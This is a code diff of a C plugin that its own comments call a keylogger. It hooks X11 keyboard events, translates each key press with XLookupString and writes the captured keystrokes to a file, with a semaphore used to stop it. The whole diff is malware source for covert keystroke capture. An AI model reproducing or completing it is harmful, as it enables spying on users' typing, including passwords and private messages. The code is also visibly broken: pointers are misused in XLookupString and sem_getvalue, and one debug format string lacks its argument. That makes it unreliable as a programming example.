@@ -3,9 +3,11 @@
 #include <string.h>
 #include <unistd.h>
 #include <X11/Xlib.h>
+#include <X11/keysym.h>
 #include <semaphore.h>
 #include <sys/types.h>
 #include <sys/wait.h>
+#include <fcntl.h>
 
 #include "../include/encrypt.h"
 #include "../include/hydrogen.h"
@@ -21,20 +23,24 @@
 int init_plugin()
 {
 	int flag = 0;
-	char buffer;
+	char* buffer, *keysym_name;
+	int* val;
 	FILE* f;
-	sem_t close_sem;
+	sem_t * close_sem;
 
 	Display* dply;
 	XEvent event;
-	KeySym symb;
+	KeySym symb = NoSymbol;
+	Status status;
 
+
+	val = 0;
 
 	/**
 	 * Open the semaphore, for being able to turn off the keylogger
 	 */
 
-	if((close_sem = sem_open(SEM, O_CREAT, S_IRUSR | S_SIWUSR, 1)) == SEM_FAILED)
+	if((close_sem = sem_open(SEM, O_CREAT, S_IRUSR | S_IWUSR, 1)) == SEM_FAILED)
 	{
 		DEBUG_PRINT((P_ERROR"Failed to create semaphore"));
 		return ERROR;
@@ -59,27 +65,41 @@ int init_plugin()
 		return ERROR;
 	}
 
-	while(flag == 0){
+	while(val == 0){
 		/**
 		 * Get the info in bytes and dump it in a bin file
 		 */
 
 		XNextEvent(dply, &event);
 
-		if(event.xany.type  == KeyPress){
+		if(event.type  == KeyPress){
 
 			// Event to check, buffer where it would be stored, max size, Gets the mod keys(shift
 			// ctrl lock), if 0 does not do anything
-			XlookupString(&event.xkey, &buffer, 99, &symb, 0);
+			XLookupString(&event.xkey, &buffer, sizeof(buffer), &symb, &status);
 
-			//TODO : Do something about the mod keys
-
-			//TODO: print buffer somewhere
-
-			fwrite(&buffer, sizeof(char), 1, f);
+			switch(status){
+				case XLookupChars:
+					fwrite(&buffer, sizeof(buffer), 1, f);
+					DEBUG_PRINT((P_INFO"%s was taken from the keyboard event", buffer));
+					break;
+				
+				case XLookupBoth:
+					//TODO: Something depending on keysim
+					keysym_name = XKeysymToString(symb);
+					DEBUG_PRINT((P_INFO"%s was taken with %s KeySym from the keyboard event", buffer, keysym_name));
+					break;
+				case XLookupKeySym:
+					//Do nothing, probably
+					DEBUG_PRINT((P_INFO"%s Keysym was taken from keyboard event"));
+					break;
+				default:
+					DEBUG_PRINT((P_INFO"Something weird happened on their end but could be our end"));
+			}
 		}
-
+		sem_getvalue(close_sem, val);
 	}
 
+	return OK;
 }
 
